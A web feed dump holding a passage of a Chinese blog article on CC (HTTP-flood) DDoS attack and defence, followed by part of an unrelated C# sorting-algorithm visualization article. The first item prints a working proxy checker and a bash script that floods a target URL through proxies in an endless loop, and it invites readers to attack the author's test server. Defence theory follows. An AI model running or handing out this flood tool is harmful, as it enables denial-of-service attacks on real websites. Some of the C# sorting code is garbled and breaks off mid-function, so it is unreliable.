&lt;p&gt;declare proxyListFile=”proxy.txt”  #抓取到的代理ip port对所存放的文件路径&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/77e43d48ddd7bf2a041c76ed9a8639c2.png&quot; rel=&quot;lightbox[72928]&quot; title=&quot;DDoS攻防战（二）：CC攻击工具实现与防御理论&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72929&quot; alt=&quot;041056016452998&quot; src=&quot;/images/jobbole.com/6943ea7f13eabefed50f27d6c8e1eb97.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt; check_proxy.sh
#!/bin/bash

#get proxy list
declare check_threads=10
declare line
declare times
declare ip
declare port
declare i
declare j
declare mod

function quit() {
    exit &quot;$1&quot;
}

#echo &quot;start check proxy&#39;s functionality...&quot;

#retarget the input file to stdin
if [ &quot;$#&quot; -gt &quot;0&quot; ]
then
    exec 0&amp;lt;$1
else
    exec 1&amp;gt;&amp;amp;2
    echo &quot;usage: bash $0 proxyListFile.txt&quot;
    echo &quot;error: must have one input arg&quot;
    quit 1
fi

#check proxy&#39;s functionality
times=0
while read line
do
    times=$((times+1))
    j=0
    for i in `echo $line | tr &#39; &#39; &#39;\n&#39; | grep -E &#39;^[^\s].*$&#39;`
    do
        j=$((j+1))
        if [ &quot;$j&quot; -eq 1 ]
        then
            ip=$i
        else
            port=$i
        fi
    done
    #echo &quot;times=$times ip=$ip port=$port&quot;
    # start test
    if GET -t 5 -p &quot;http://$ip:$port&quot; &quot;http://baidu.com&quot; &amp;amp;&amp;gt;/dev/null
    then 
        echo &quot;$ip $port&quot;
        echo &quot;:) ip=$ip port=$port &quot; &amp;amp;&amp;gt;/dev/null
    else
        echo &quot;invalid ip=$ip port=$port : please check ip:host or network&quot; &amp;amp;&amp;gt;/proc/self/fd/2
    fi &amp;amp;
    mod=$((times%check_threads))
    if [ &quot;$mod&quot; -eq &quot;0&quot; ]
    then
        wait
    fi
done

#close the fd of input file
exec 0&amp;gt;&amp;amp;-
quit 0
#exit&lt;/pre&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;declare check_threads=10 #验证代理可用性时的并发数，看一下代码就会发现，我们使用的是GET http://baidu.com方法，所以，并发数请不要也太高 :) 除非你的目标就是……&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/e0c058e362f900a0901c3f3be14e86eb.png&quot; rel=&quot;lightbox[72928]&quot; title=&quot;DDoS攻防战（二）：CC攻击工具实现与防御理论&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72930&quot; alt=&quot;041104385362485&quot; src=&quot;/images/jobbole.com/5fff9fef2464fe71a74895c982cdfbc3.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;总结：应征入伍的士兵共计600人，经过考核的共计449人，如果你还想招募更多的士兵，奉劝一句，苦海无边，回头是岸。&lt;br&gt;
&lt;strong&gt;第二步：吹响战争号角&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;笔者在一台VPS上建立了一个薄弱的靶机，各位读者请不要太暴力，测试一下就可以了，地址 http://eecs.cc:8080/&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/811e17070d500a61dafb2c62bb3f8aed.png&quot; rel=&quot;lightbox[72928]&quot; title=&quot;DDoS攻防战（二）：CC攻击工具实现与防御理论&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72931&quot; alt=&quot;041127125528891&quot; src=&quot;/images/jobbole.com/2869c5c97871f3f7c6319b0639f4bbeb.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;笔者把这么重要的信息都放出来了，读者请点个赞吧  &lt;strong&gt;:)&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;cc.sh
#!/bin/bash

declare target_url=&quot;http://eecs.cc:8080/&quot;
declare get_timeout_sec=5
declare line
declare times
declare ip
declare port
declare i
declare j

function quit() {
    exit &quot;$1&quot;
}

#retarget the input file to stdin
if ! [ &quot;$#&quot; -gt &quot;0&quot; ]
then
    exec 1&amp;gt;&amp;amp;2
    echo &quot;challenge collapsar attack -- cc attack&quot;
    echo &quot;usage: bash $0 proxyListFile.txt&quot;
    echo &quot;error: must have one input arg&quot;
    quit 1
fi

echo &quot;report : total `cat $1 | wc -l` proxy-soldiers are ready for command&quot;
echo &quot;command: target: $target_url&quot;
echo &quot;command: start challenge collapsar attack   :)   amazing...&quot;

exec 0&amp;lt;$1
#start challenge collapsar attack

while true
do
    times=0
    exec 0&amp;lt;&amp;amp;-
    exec 0&amp;lt;$1
    while read line
    do
        times=$((times+1))
        j=0
        for i in `echo $line | tr &#39; &#39; &#39;\n&#39; | grep -E &#39;^[^\s].*$&#39;`
        do
            j=$((j+1))
            if [ &quot;$j&quot; -eq 1 ]
            then
                ip=$i
            else
                port=$i
            fi
        done
        echo &quot;times=$times ip=$ip port=$port&quot;
        #single soldier attack
        if GET -t &quot;$get_timeout_sec&quot; -p &quot;http://$ip:$port&quot; &quot;$target_url&quot; &amp;amp;&amp;gt;/dev/null 
        then 
            echo &quot;soldier$times attack $target_url :)&quot;
        else
            echo &quot;soldier$times attack $target_url miss&quot;
        fi &amp;amp;
    done
    wait
done

#close the fd of input file
exec 0&amp;gt;&amp;amp;-
quit 0
#exit&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/bf67c68ed3a4be73358dd3e54201bb3b.png&quot; rel=&quot;lightbox[72928]&quot; title=&quot;DDoS攻防战（二）：CC攻击工具实现与防御理论&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72932&quot; alt=&quot;041139274425845&quot; src=&quot;/images/jobbole.com/f9e5061fc3c86c56844dfbf0ae43a4b0.jpg&quot;&gt;&lt;/a&gt;&lt;br&gt;
读者可自行尝试攻击这个站点，然后使用浏览器访问查看服务器网络状况，此时大量连接处于TIME_WAIT状态，参考TCP状态机，这一状态为主动关闭一方的最终等待状态。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请不要恶意攻击别人的网站 如果因此被关了进去 没有人能把你弄出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  应用层DDoS的防御理论：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  问题模型描述：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  &lt;/strong&gt;每一个页面，都有其资源消耗权重，静态资源，权重较低，动态资源，权重较高。对于用户访问，有如下：&lt;/p&gt;
&lt;p&gt;用户资源使用频率=使用的服务器总资源量/s&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  命题一：对于正常访问的用户，资源使用频率必定位于一个合理的范围，当然会存在大量正常用户共享ip的情况，这就需要日常用户访问统计，以得到忠实用户ip白名单。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  命题二：资源使用频率持续异常的，可断定为访问异常的用户。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  防御体系状态机：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  1.在系统各项资源非常宽裕时，向所有ip提供服务，每隔一段时间释放一部分临时黑名单中的ip成员；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  2.在系统资源消耗达到某一阈值时，降低Syn包接受速率，循环：分析最近时间的日志，并将访问异常的ip加入临时黑名单；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  3.若系统资源消耗慢慢回降至正常水平，则恢复Syn包接受速率，转到状态1；若目前策略并未有效地控制住系统资源消耗的增长，情况继续恶劣至一极限阈值，转到状态4；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  4.最终防御方案，使用忠实用户ip白名单、异常访问ip黑名单策略，其他访问可慢慢放入，直到系统资源消耗回降至正常水平，转到状态1。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 上述的&lt;strong&gt;防御状态机，对于单个攻击IP高并发的DDOS，变化到状态3时，效果就完全体现出来了，但&lt;/strong&gt;如果防御状态机进行到4状态，则有如下两种可能：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  &lt;/strong&gt;1.站点遭到了攻击群庞大的、单个IP低并发的DDOS攻击；&lt;/p&gt;
&lt;p&gt;2.站点突然间有了很多访问正常的新用户。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 建议后续工作：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  &lt;/strong&gt;保守：站点应尽快进行服务能力升级。&lt;/p&gt;
&lt;p&gt;积极：尽所能，追溯攻击者。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  追溯攻击者：&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;    &lt;/strong&gt;CC：proxy-forward-from-ip&lt;br&gt;
单个IP高并发的DDOS：找到访问异常的、高度可疑的ip列表，exploit，搜集、分析数据，因为一个傀儡主机可被二次攻占的概率很大（但不建议这种方法）&lt;br&gt;
单个IP低并发的DDOS：以前极少访问被攻击站点，但是在攻击发生时，却频繁访问我们的站点，分析日志得到这一部分ip列表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;   追溯攻击者的过程中，snat与web proxy增加了追踪的难度，如果攻击者采用多个中继服务器的方法，追溯将变得极为困难。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防御者：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.应对当前系统了如指掌，如系统最高负载、最高数据处理能力，以及系统防御体系的强项与弱点&lt;/li&gt;
&lt;li&gt;2.历史日志的保存、分析&lt;/li&gt;
&lt;li&gt;3.对当前系统进行严格安全审计&lt;/li&gt;
&lt;li&gt;4.上报公安相关部分，努力追溯攻击者&lt;/li&gt;
&lt;li&gt;5.网站，能静态，就一定不要动态，可采取定时从主数据库生成静态页面的方式，对需要访问主数据库的服务使用验证机制。&lt;/li&gt;
&lt;li&gt;6.防御者应能从全局的角度，迅速及时地发现系统正在处于什么程度的攻击、何种攻击，在平时，应该建立起攻击应急策略，规范化操作，免得在急中犯下低级错误&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;对历史日志的分析这时将会非常重要，数据可视化与统计学的方法将会很有益处：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.分析每个页面的平均访问频率&lt;/p&gt;
&lt;p&gt;2.对访问频率异常的页面进行详细分析 分析得到ip-页面访问频率&lt;/p&gt;
&lt;p&gt;3.得到对访问异常页面的访问异常ip列表&lt;/p&gt;
&lt;p&gt;4.对日志分析得到忠实用户IP白名单&lt;/p&gt;
&lt;p&gt;5.一般一个页面会关联多个资源，一次对于这样的页面访问往往会同时增加多个资源的访问数，而攻击程序一般不会加载这些它不感兴趣的资源，所以，这也是一个非常好的分析突破点&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;本文主要讲述了DDoS攻击之一的CC攻击工具实现，以及如何防御来自应用层的DDoS攻击的理论总结。接下来的文章，笔者将会实现一个工作于内核态的、具有黑名单功能的防火墙模块，以对应于上述防御状态机中的防火墙单元，它实现了自主地动态内存管理，使用hash表管理ip列表，并可以自定义hash表的modular。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;附录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;《&lt;a href=&quot;http://blog.jobbole.com/72919/&quot; target=&quot;_blank&quot;&gt;DDoS攻防战 （一） ： 概述&lt;/a&gt;&lt;br&gt;
&lt;/strong&gt;&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 07 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-07-72928-17974e8b2.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-07-72928-17974e8b2.html</guid>
        
        
      </item>
    
      <item>
        <title>可视化对比十多种排序算法（C#版）</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;在这篇文章中，我会向大家展示一些排序算法的可视化过程。我还写了一个工具，大家可对比查看某两种排序算法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.codeproject.com/KB/recipes/SortVisualization/SortComparison_src.zip&quot; target=&quot;_blank&quot;&gt;下载源码 – 75.7 KB&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.codeproject.com/KB/recipes/SortVisualization/SortComparison_bin.zip&quot; target=&quot;_blank&quot;&gt;下载示例 – 27.1 KB&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;引言&lt;/h3&gt;
&lt;p&gt;首先，我认为是最重要的是要理解什么是“排序算法”。根据维基百科，&lt;b&gt;排序算法&lt;/b&gt;（Sorting algorithm）是一种能将一串数据依照特定排序方式进行排列的一种算法。最常用到的排序方式是数值顺序以及字典顺序。有效的排序算法在一些算法（例如搜索算法与合并算法）中是重要的，如此这些算法才能得到正确解答。排序算法也用在处理文字数据以及产生人类可读的输出结果。&lt;/p&gt;
&lt;p&gt;接下来，我会说明一些算法。所有算法皆由C#代码实现，大部分的算法思想都可以在维基百科上找到。 所呈现的算法有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;双向冒泡排序&lt;/li&gt;
&lt;li&gt;冒泡排序&lt;/li&gt;
&lt;li&gt;桶排序&lt;/li&gt;
&lt;li&gt;梳排序&lt;/li&gt;
&lt;li&gt;循环排序&lt;/li&gt;
&lt;li&gt;地精排序&lt;/li&gt;
&lt;li&gt;堆排序&lt;/li&gt;
&lt;li&gt;插入排序&lt;/li&gt;
&lt;li&gt;归并排序&lt;/li&gt;
&lt;li&gt;奇偶排序&lt;/li&gt;
&lt;li&gt;鸽笼排序&lt;/li&gt;
&lt;li&gt;快速排序&lt;/li&gt;
&lt;li&gt;使用冒泡的快排&lt;/li&gt;
&lt;li&gt;选择排序&lt;/li&gt;
&lt;li&gt;希尔排序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我已经决定要创建GUI可视化的排序算法。该项目还允许用户保存为GIF图像及设置动画输出排序速度。&lt;/p&gt;
&lt;h3&gt;使用代码&lt;/h3&gt;
&lt;p&gt;该解决方案由两个项目组成。第一个项目称为组件提供的创建GIF动画图像类。该项目是基于NGIF项目的。关于这个项目的更多信息可以&lt;a href=&quot;http://www.codeproject.com/KB/GDI-plus/NGif.aspx&quot; target=&quot;_blank&quot;&gt;在这里找到&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;第二个项目可以称为排序比较，它是解决方案的主要组成部分。其中，通过一个名为frmMain的结构可以选择排序算法，设置你想要排序，排序的速度，排序数量，并选择是否要创建动态图片。在窗体上放置两个面板称为pnlSort1和pnlSort2，其中分拣可视化的呈现方式。&lt;/p&gt;
&lt;p&gt;每个算法都都通过自己的排序方式进行命名，并接受一个IList参数，并返回一个IList对象。&lt;/p&gt;
&lt;p&gt;DrawSamples方法可以在面板上进行绘图。产生的随机样本之后就会调用它。通过点击随机按钮生成的样本会保存在数组中。&lt;/p&gt;
&lt;pre class=&quot;brush: actionscript3; gutter: true&quot;&gt;private void DrawSamples()
{
    g.Clear(Color.White);

    for (int i = 0; i &amp;lt; array.Count; i++)
    {
        int x = (int)(((double)pnlSamples.Width / array.Count) * i);

        Pen pen = new Pen(Color.Black);
        g.DrawLine(pen, new Point(x, pnlSamples.Height), 
          new Point(x, (int)(pnlSamples.Height - (int)array[i])));
    }
}&lt;/pre&gt;
&lt;p&gt;该方法随机产生数据放于数组中。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public void Randomize(IList list)
{
    for (int i = list.Count - 1; i &amp;gt; 0; i--)
    {
        int swapIndex = rng.Next(i + 1);
        if (swapIndex != i)
        {
            object tmp = list[swapIndex];
            list[swapIndex] = list[i];
            list[i] = tmp;
        }
    }
}&lt;/pre&gt;
&lt;p&gt;在排序过程中，当复选框创建的动画被选中，数组中两个数交换的话就会产生图像。此图像索引从0到n，其中n代表交换的次数。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;private void SavePicture()
{
    ImageCodecInfo myImageCodecInfo = this.getEncoderInfo(&quot;image/gif&quot;); 
    EncoderParameter myEncoderParameter = new EncoderParameter(
      System.Drawing.Imaging.Encoder.Compression, (long)EncoderValue.CompressionLZW);
    EncoderParameter qualityParam = 
      new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 0L);
    EncoderParameters myEncoderParameters = new EncoderParameters(1);

    EncoderParameters encoderParams = new EncoderParameters(2);
    encoderParams.Param[0] = qualityParam;
    encoderParams.Param[1] = myEncoderParameter;

    string destPath = 
      System.IO.Path.Combine(txtOutputFolder.Text, imgCount + &quot;.gif&quot;);
    bmpsave.Save(destPath, myImageCodecInfo, encoderParams);
    imgCount++;
}&lt;/pre&gt;
&lt;h3&gt;排序算法&lt;/h3&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E6%B0%A3%E6%B3%A1%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;冒泡排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/8dbcbc79387050c2addd69768214f473.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;冒泡排序也被称为下沉排序，是一个简单的排序算法，通过多次重复比较每对相邻的元素，并按规定的顺序交换他们，最终把数列进行排好序。一直重复下去，直到结束。该算法得名于较小元素“气泡”会“浮到”列表顶部。由于只使用了比较操作，所以这是一个比较排序。&lt;/p&gt;
&lt;p&gt;冒泡排序算法的运作如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;比较相邻的元素。如果第一个比第二个大，就交换他们两个。&lt;/li&gt;
&lt;li&gt;对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。&lt;/li&gt;
&lt;li&gt;针对所有的元素重复以上的步骤，除了最后一个。&lt;/li&gt;
&lt;li&gt;持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;由于它的简洁，冒泡排序通常被用来对于程序设计入门的学生介绍算法的概念。但同样简单的插入排序比冒泡排序性能更好，所以有些人认为不需要再教冒泡排序了。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList BubbleSort(IList arrayToSort)
{
    int n = arrayToSort.Count - 1;
    for (int i = 0; i &amp;lt; n; i++)
    {
        for (int j = n; j &amp;gt; i; j--)
        {
            if (((IComparable)arrayToSort[j - 1]).CompareTo(arrayToSort[j]) &amp;gt; 0)
            {
                object temp = arrayToSort[j - 1];
                arrayToSort[j - 1] = arrayToSort[j];
                arrayToSort[j] = temp;
                RedrawItem(j);
                RedrawItem(j - 1);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
            }
        }
    }
    return arrayToSort;
}&lt;/pre&gt;
&lt;table class=&quot;ArticleTable&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1) auxiliary&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E9%B8%A1%E5%B0%BE%E9%85%92%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;双向冒泡排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/7dedcf6f806ff2550d2ccf3a031f4d56.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;鸡尾酒排序，也称为双向冒泡排序、调酒器排序、搅拌排序（可以参考选择排序的一个变种）、纹波排序、接送排序，或欢乐时光排序。它由冒泡排序变化而来，是一种稳定的比较排序算法。该算法不同于冒泡排序，它在排序上由两个方向同时进行。该排序算法只是比冒泡排序稍难实现，但解决了冒泡排序中的“乌龟问题”（数组尾部的小值）。&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;br&gt;
&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先从左向右方向为大元素移动方向，从右向左方向为小元素移动方向，然后每个元素都依次执行。在第 i 次移动后，前 i 个元素和后个 i 元素都放到了正确的位置，也不需要在检查一次。每次缩短已排序的那部分列表，都可以减半操作次数。&lt;/p&gt;
&lt;p&gt;但是在乱数序列的状态下，双向冒泡排序与冒泡排序的效率都很差劲。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList BiDerectionalBubleSort(IList arrayToSort) 
{
    int limit = arrayToSort.Count;
    int st = -1;
    bool swapped = false;
    do
    {
        swapped = false;
        st++;
        limit--;

        for (int j = st; j &amp;lt; limit; j++)
        {
            if (((IComparable)arrayToSort[j]).CompareTo(arrayToSort[j + 1]) &amp;gt; 0)
            {
                object temp = arrayToSort[j];
                arrayToSort[j] = arrayToSort[j + 1];
                arrayToSort[j + 1] = temp;
                swapped = true;
                RedrawItem(j);
                RedrawItem(j + 1);
                pnlSamples.Refresh();
                if(chkCreateAnimation.Checked)
                    SavePicture();

            }
        }
        for (int j = limit - 1; j &amp;gt;= st; j--)
        {
            if (((IComparable)arrayToSort[j]).CompareTo(arrayToSort[j + 1]) &amp;gt; 0)
            {
                object temp = arrayToSort[j];
                arrayToSort[j] = arrayToSort[j + 1];
                arrayToSort[j + 1] = temp;
                swapped = true;
                RedrawItem(j);
                RedrawItem(j + 1);

                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();

            }
        }

    } while (st &amp;lt; limit &amp;amp;&amp;amp; swapped);

    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1) auxiliary&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E6%A1%B6%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;桶排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;桶排序，或称为箱排序，是一种把数列划分成若干个桶的排序算法。在每个桶内各自排序，或者使用不同的排序算法，或通过递归方式继续使用桶排序算法。这是一个分布排序，是最能体现出数字意义的一种基数排序。桶排序是鸽巢排序的一种归纳结果。当要被排序的数组内的数值是均匀分配的时候，桶排序使用线性时间（Θ（&lt;i&gt;n&lt;/i&gt;））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。&lt;/p&gt;
&lt;p&gt;桶排序的流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置一个定量的数组当作空桶子。&lt;/li&gt;
&lt;li&gt;寻访串行，并且把项目一个一个放到对应的桶子去。&lt;/li&gt;
&lt;li&gt;对每个不是空的桶子进行排序。&lt;/li&gt;
&lt;li&gt;从不是空的桶子里把项目再放回原来的串行中。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList BucketSort(IList arrayToSort)
{
    if (arrayToSort == null || arrayToSort.Count == 0) return arrayToSort;

    object max = arrayToSort[0];
    object min = arrayToSort[0];

    for (int i = 0; i  0)
        {
            max = arrayToSort[i];
        }

        if (((IComparable)arrayToSort[i]).CompareTo(min) &amp;lt; 0)
        {
            min = arrayToSort[i];
        }
    }
    ArrayList[] holder = new ArrayList[(int)max - (int)min + 1];

    for (int i = 0; i &amp;lt; holder.Length; i++)
    {
        holder[i] = new ArrayList();
    }

    for (int i = 0; i &amp;lt; arrayToSort.Count; i++)
    {
        holder[(int)arrayToSort[i] - (int)min].Add(arrayToSort[i]);
    }

    int k = 0;

    for (int i = 0; i  0)
        {
            for (int j = 0; j &amp;lt; holder[i].Count; j++)
            {
                arrayToSort[k] = holder[i][j];
                RedrawItem(k);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                k++;
            }
        }
    }

    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;.k)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n.k)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n.k)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;梳排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/ff8c98967479ac66ae912f7947c8f5ef.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;梳排序是一个相对简单的排序算法，最初它由Wlodzimierz Dobosiewicz于1980年设计出来。后来由斯蒂芬和理查德重新发现和推广。他们的文章在1991年4月发表在字节杂志上。梳排序改善了冒泡排序和类似快速排序的竞争算法。其要旨在于消除&lt;span style=&quot;color: #ff0000;&quot;&gt;乌龟&lt;/span&gt;，亦即在阵列尾部的小数值，这些数值是造成冒泡排序缓慢的主因。相对地，&lt;span style=&quot;color: #ff0000;&quot;&gt;兔子&lt;/span&gt;，亦即在阵列前端的大数值，不影响冒泡排序的效能。&lt;/p&gt;
&lt;p&gt;在冒泡排序中，任何两个元素进行比较时，他们总是距离彼此为1。梳排序的基本思想是可以不是1。&lt;/p&gt;
&lt;p&gt;梳排序中，开始时的间距设定为列表长度，然后每一次都会除以损耗因子(一般为1.3)。必要的时候，间距可以四舍五入，不断重复，直到间距变为1。然后间距就保持为1，并排完整个数列。最后阶段就相当于一个冒泡排序，但此时大多数乌龟已经处理掉，此时的冒泡排序就高效了。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList CombSort(IList arrayToSort)
{
    int gap = arrayToSort.Count;
    int swaps = 0;

    do
    {
        gap = (int)(gap / 1.247330950103979);
